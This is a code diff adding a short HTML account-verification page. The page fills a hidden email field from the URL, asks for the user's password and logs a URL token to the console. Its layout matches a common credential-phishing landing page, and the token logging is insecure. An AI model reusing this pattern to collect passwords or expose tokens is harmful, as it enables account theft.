@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Page</title>
+</head>
+<body>
+    <div id="verificationForm">
+        <h2>Please verify your account</h2>
+        <form action="/submit-verification" method="POST">
+            <input type="hidden" id="email"  name="mail">
+            <label for="password">Enter your password:</label>
+            <input type="password" id="password"  name="password" required>
+            <button type="submit" name="button">Verify</button>
+        </form>
+    </div>
+
+    <script>
+        // Get the email and token from the URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email');
+        const token = urlParams.get('token'); // You can use the token for verification on the backend
+        const baseURL = "https://yourwebsite.com/verification";
+
+        // Set the email in the hidden field of the form
+        if (email) {
+            document.getElementById('email').value = email;
+        }
+
+        // You can also handle the token if needed (e.g., validate it on the backend)
+        console.log('Verification Token:', token); // Just for demonstration purposes
+    </script>
+</body>
+</html>
